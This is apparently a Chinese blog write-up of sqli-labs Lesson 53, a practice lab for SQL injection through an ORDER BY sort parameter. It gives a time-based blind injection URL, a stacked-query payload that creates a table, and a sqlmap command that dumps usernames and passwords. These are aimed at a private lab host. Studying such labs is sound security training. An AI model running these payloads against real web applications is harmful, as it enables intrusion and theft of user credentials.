---
title: sqli-labs-lession-53-GET-盲注-字符型堆叠注入-OrderBy注入
date: 2018-11-19 10:52:33
tags: [sqli-labs]
categories: sql注入
---

# sqli-labs-lession-53-GET-盲注-字符型堆叠注入-OrderBy注入

---

## 登录界面

![001](/img/sql/Lesson-53/001.png)

## 注入

判断是引号闭合,好像只能利用时间盲注,效率好低啊。

### 时间盲注payload

`http://10.60.17.35:8082/Less-53/?sort=1'+and if(8=length(database()),sleep(3),1)%23`

![002](/img/sql/Lesson-53/002.png)

## 堆叠注入

`http://10.60.17.35:8082/Less-53/?sort=1';create+table+less-53+like+users%23`

![003](/img/sql/Lesson-53/003.png)

## SQLMAP

![004](/img/sql/Lesson-53/004.png)

![005](/img/sql/Lesson-53/005.png)

`sqlmap -u "http://10.60.17.35:8082/Less-53/?sort=1" --technique T --dbms mysql --level 2 -v 3 -D security -T users -C username,password --dump`

![006](/img/sql/Lesson-53/006.png)

![007](/img/sql/Lesson-53/007.png)





